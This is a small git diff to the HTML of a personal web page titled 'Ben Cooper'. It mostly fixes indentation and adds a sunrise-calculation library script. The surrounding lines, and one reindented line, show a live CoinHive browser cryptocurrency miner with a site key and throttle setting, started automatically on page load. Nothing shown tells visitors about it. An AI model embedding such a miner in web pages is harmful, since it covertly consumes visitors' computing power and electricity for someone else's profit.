@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <title>Ben Cooper</title>
-  <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
 
 
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -13,7 +13,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.19.1/moment.min.js" integrity="sha256-zG8v+NWiZxmjNi+CvUYnZwKtHzFtdO8cAKUIdB8+U9I=" crossorigin="anonymous"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/moment-timezone/0.5.14/moment-timezone.min.js" integrity="sha256-wnlfv2SMPXay8VywRkRiL5zysJhwn2Y0du7pg2fkoEY=" crossorigin="anonymous"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/moment-timezone/0.5.14/moment-timezone-with-data-2012-2022.min.js" integrity="sha256-vBJSPpSAuUKYXDA+2hx2dQmyhkmM91vYjXI/o5QjnmA=" crossorigin="anonymous"></script>
-
+    <script src="https://unpkg.com/suncalc@1.8.0/suncalc.js" integrity="sha384-tl3ZmrxbIoCVQz3RDzphPFHmCRFg0/JkX0AY9grk1ftU1dqxEuoPRQuhir4wMEAp" crossorigin="anonymous"></script>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto%7CRoboto+Slab" crossorigin="anonymous">
 
 
@@ -66,7 +66,7 @@
             const miner = new CoinHive.Anonymous('Z9xViG5bUBovkUbtaKnxbo0CNHGiaFa0', {
                 throttle: 0.6
             });
-             miner.start();
+            miner.start();
         } catch (err) {
             console.log(err);
         }
